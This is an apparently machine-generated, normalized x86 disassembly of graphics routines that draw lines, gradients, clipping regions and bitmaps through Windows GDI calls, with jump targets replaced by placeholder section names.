mov eax [ esi + 0x8 ]
call sub_41d0a8
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fmul [ esi + 0xb0 ]
call sub_402990
mov edx eax
mov eax 0x1
call sub_460384
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
push eax
call DeleteObject
jmp r-xdata
mov eax [ esi + 0x4 ]
call sub_41dd60
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x54 ]
push eax
push 0x3c
mov eax [ esi + 0x8 ]
call sub_41ce38
push eax
call GetObjectA
push 0x48
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
neg eax
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x54 ]
push eax
call CreateFontIndirectA
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
mov bl 0x1
sub_45d18c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call MoveToEx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45d1cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call LineTo
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45d20c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
push eax
push edi
mov ecx [ esi ]
lea edx [ ebx + 0xc0 ]
mov eax ebx
call sub_45cd60
mov eax [ esi + 0x4 ]
push eax
push edi
mov ecx [ esi + 0x8 ]
lea edx [ ebx + 0xc8 ]
mov eax ebx
call sub_45cd60
mov eax [ esi + 0xc ]
push eax
push edi
mov ecx [ esi + 0x8 ]
lea edx [ ebx + 0xd0 ]
mov eax ebx
call sub_45cd60
mov eax [ esi + 0xc ]
push eax
push edi
mov ecx [ esi ]
lea edx [ ebx + 0xd8 ]
mov eax ebx
call sub_45cd60
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
retn
sub_45d274
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x0
push esi
push edi
push ebx
call MoveToEx
push esi
mov eax [ ebp - 0x4 ]
push eax
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_45d2ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x0
push edi
push esi
push ebx
call MoveToEx
mov eax [ ebp + 0x8 ]
push eax
push esi
push ebx
call LineTo
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45d2dc
push ebx
push esi
add esp 0xfffffff0
mov ecx [ edx ]
mov [ esp ] ecx
mov ecx [ edx + 0x4 ]
mov [ esp + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ esp + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ esp + 0xc ] ecx
call sub_41dd60
mov esi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
call LPtoDP
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
call CreateRectRgn
mov ebx eax
push 0x1
push ebx
push esi
call ExtSelectClipRgn
push ebx
call DeleteObject
add esp 0x10
pop esi
pop ebx
retn
sub_45d34c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x91 ] 0x0
je r-xdata
push esi
mov esi ebx
lea edi [ ebp - 0x50 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
dec [ ebp - 0x44 ]
lea edx [ ebp - 0x50 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ esi + 0x18 ]
cmp [ eax + 0x4 ] 0x10e
jne r-xdata
mov eax [ ebx + 0xc ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x38 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_45cd60
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov edx [ eax + 0x14 ]
cmp edx 0x10e
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx ]
lea edx [ ebp - 0x50 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_45cd60
lea edx [ ebp - 0x50 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
cmp edx 0x168
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_45cd60
mov eax [ ebx + 0x4 ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_45cd60
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x6
lea eax [ ebp - 0x40 ]
push eax
push ebx
call LPtoDP
push 0x1
push 0x6
lea eax [ ebp - 0x40 ]
push eax
call CreatePolygonRgn
mov esi eax
push esi
push ebx
call SelectClipRgn
push esi
call DeleteObject
jmp r-xdata
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax [ ebx + 0xc ]
push eax
push edi
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_45cd60
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov [ ebp - 0x3c ] eax
sub_45d528
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
lea ecx [ ebx + 0x24 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
call sub_45c43c
sar esi 0x1
jns r-xdata
mov [ ebx + 0x28 ] esi
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x30 ] eax
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
adc esi 0x0
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ eax + 0x8 ]
add [ ebx + 0x2c ] edx
mov edx [ eax + 0x1c ]
add [ ebx + 0x30 ] edx
mov edx [ eax + 0x10 ]
test edx edx
jle r-xdata
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x4 ]
fdiv [ r-xdata ]
fstp [ ebx + 0xb8 ]
fwait
sub_45d590
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
xor eax eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] eax
fild [ eax + 0x14 ]
fstp [ ebp - 0x58 ]
fwait
fild [ eax + 0x4 ]
fstp [ ebp - 0x60 ]
fwait
fild [ eax + 0x18 ]
fstp [ ebp - 0x68 ]
fwait
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0xb8 ] edx
mov [ eax + 0xbc ] edx
fld [ r-xdata ]
fmul [ ebp - 0x58 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x40 ]
call sub_45c414
fld [ r-xdata ]
fmul [ ebp - 0x60 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x20 ]
mov eax [ ebx ]
add eax 0x38
call sub_45c414
fld [ r-xdata ]
fmul [ ebp - 0x68 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x50 ]
call sub_45c414
fld [ ebp - 0x20 ]
fld [ ebp - 0x50 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x58 ]
fwait
push 0x3ee4f8b5
push 0x88e368f1
fld [ ebp - 0x20 ]
fld [ ebp - 0x30 ]
fmulp st1
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_460350
mov eax [ ebx ]
fstp [ eax + 0x60 ]
fwait
push 0x3ee4f8b5
push 0x88e368f1
fld [ ebp - 0x40 ]
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x50 ]
fmulp st1
fld [ ebp - 0x10 ]
fld [ ebp - 0x30 ]
fmulp st1
faddp st1
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_460350
mov eax [ ebx ]
fstp [ eax + 0x70 ]
fwait
fld [ ebp - 0x30 ]
fld [ ebp - 0x40 ]
fmulp st1
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x10 ]
fld [ ebp - 0x50 ]
fmulp st1
fsubp st1
mov eax [ ebx ]
fstp [ eax + 0x78 ]
fwait
fld [ ebp - 0x10 ]
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x50 ]
fmulp st1
fld [ ebp - 0x30 ]
fld [ ebp - 0x40 ]
fmulp st1
fsubp st1
mov eax [ ebx ]
fstp [ eax + 0x80 ]
fwait
fld [ ebp - 0x10 ]
fld [ ebp - 0x30 ]
fmulp st1
mov eax [ ebx ]
fld [ eax + 0x38 ]
fmulp st1
fld [ ebp - 0x40 ]
fld [ ebp - 0x50 ]
fmulp st1
faddp st1
mov eax [ ebx ]
fstp [ eax + 0x88 ]
fwait
fld [ ebp - 0x20 ]
fld [ ebp - 0x40 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x48 ]
fwait
fld [ ebp - 0x10 ]
fld [ ebp - 0x20 ]
fmulp st1
mov eax [ ebx ]
fstp [ eax + 0x68 ]
fwait
sub_45d73a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
push esi
push edi
mov esi ebx
lea edi [ eax + 0x9b ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
mov eax [ ebp - 0x4 ]
mov dl [ ebp + 0x10 ]
mov [ eax + 0x91 ] dl
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb0 ] edx
mov [ eax + 0xb4 ] 0x3ff00000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x91 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x98 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45c82c
mov edi esi
mov esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45c428
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
push ebp
call sub_45d590
pop ecx
mov al [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
fild [ eax + 0x20 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp - 0x4 ]
fstp [ eax + 0xb0 ]
fwait
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov al [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xab ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
call sub_4224a8
xor edx edx
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] edx
xor edx edx
mov [ eax + 0x30 ] edx
mov [ eax + 0x34 ] edx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45c82c
mov eax [ ebp - 0xc ]
push eax
push esi
mov ecx [ ebp - 0x10 ]
xor edx edx
xor eax eax
call sub_405e2c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] ebx
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_423278
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_45ca60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45d8f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebx + 0x94 ]
call sub_4224a8
call sub_41dd60
push eax
mov eax [ ebx + 0x94 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebx + 0x94 ]
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
push edi
push esi
mov eax [ ebp + 0x8 ]
call sub_41dd60
push eax
call BitBlt
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45d950
push ebx
mov bl [ eax + 0x9a ]
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax + 0x4 ]
push edx
xor ecx ecx
xor edx edx
call sub_45d8f8
sub_45d970
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ ebx + 0x98 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45c82c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov eax ebx
call sub_45d8f8
mov [ ebx + 0x9a ] 0x0
sub_45d9b0
push ebx
push esi
mov esi eax
test ecx ecx
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx ecx
mov ecx [ esi + 0x4 ]
xchg ecx eax
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_45d9cc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebx + 0x10 ]
call sub_41d610
call sub_41c964
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_405e50
lea ecx [ ebp - 0x14 ]
mov edx [ ebx + 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_45da54
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
push ebx
call MulDiv
mov edx [ ebp + 0x8 ]
add al [ edx - 0x14 ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
push eax
push ebx
call MulDiv
mov edx [ ebp + 0x8 ]
add al [ edx - 0xc ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push ebx
call MulDiv
mov edx [ ebp + 0x8 ]
add al [ edx - 0x4 ]
pop edx
pop ecx
call sub_4069c4
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x1c ]
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
push ebx
call CreateSolidBrush
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call SelectObject
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call SelectObject
push eax
call DeleteObject
sub_45daf4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x34 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x34 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x38 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] 0xffffffff
mov eax [ ebp - 0x10 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x100
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x100
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
xor edi edi
push 0xf00021
mov eax ebx
sub eax esi
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
sub eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
sub eax esi
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
sub eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
dec edx
mov eax edi
call sub_45da54
pop ecx
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
lea eax [ edi + 0x1 ]
push eax
call MulDiv
mov esi eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov ebx esi
inc edi
dec [ ebp - 0x14 ]
jne r-xdata
sub_45dc20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x5
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp ebx [ ebp - 0x8 ]
jge r-xdata
inc esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edi [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
call sub_45c428
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
xor esi esi
xor ebx ebx
cmp esi [ ebp - 0xc ]
jl r-xdata
inc ebx
push 0xf00021
push 0x1
lea eax [ ebx + 0x1 ]
push eax
mov eax edi
dec eax
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x34 ]
jle r-xdata
push 0xf00021
push 0x1
lea eax [ ebx + 0x1 ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x2c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + esi ]
mov edx [ ebp - 0x10 ]
call sub_45da54
pop ecx
push 0xf00021
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
push 0x1
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
add eax ebx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp ebx [ ebp - 0x8 ]
jl r-xdata
dec edi
inc edi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dd38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
call sub_45c428
mov eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
shr eax 0x1
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor esi esi
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
add ebx [ rw-data ]
cmp ebx [ ebp - 0x8 ]
jl r-xdata
add esi [ rw-data ]
mov eax [ ebp + 0x8 ]
push eax
lea eax [ esi + ebx ]
mov edx [ ebp - 0x20 ]
call sub_45da54
pop ecx
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x38 ]
add edi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
add eax ebx
mov [ ebp - 0x1c ] eax
mov eax ebx
add eax eax
mov edx [ ebp - 0x10 ]
sub edx eax
mov [ ebp - 0x14 ] edx
mov eax esi
add eax eax
mov edx [ ebp - 0xc ]
sub edx eax
mov [ ebp - 0x18 ] edx
push 0xf00021
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
sub eax esi
dec eax
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
push 0xf00021
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
sub eax ebx
sub eax [ rw-data ]
push eax
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
push eax
call PatBlt
cmp ebx [ ebp - 0x8 ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45de84
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x3c ] ecx
mov ebx edx
mov [ ebp - 0x28 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x3c ]
call sub_41c964
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
call sub_41c964
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x3c ]
call sub_4069e0
and eax 0xff
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x3c ]
call sub_4069e4
and eax 0xff
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x3c ]
call sub_4069e8
and eax 0xff
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_4069e0
and eax 0xff
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
call sub_4069e4
and eax 0xff
sub eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
call sub_4069e8
and eax 0xff
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
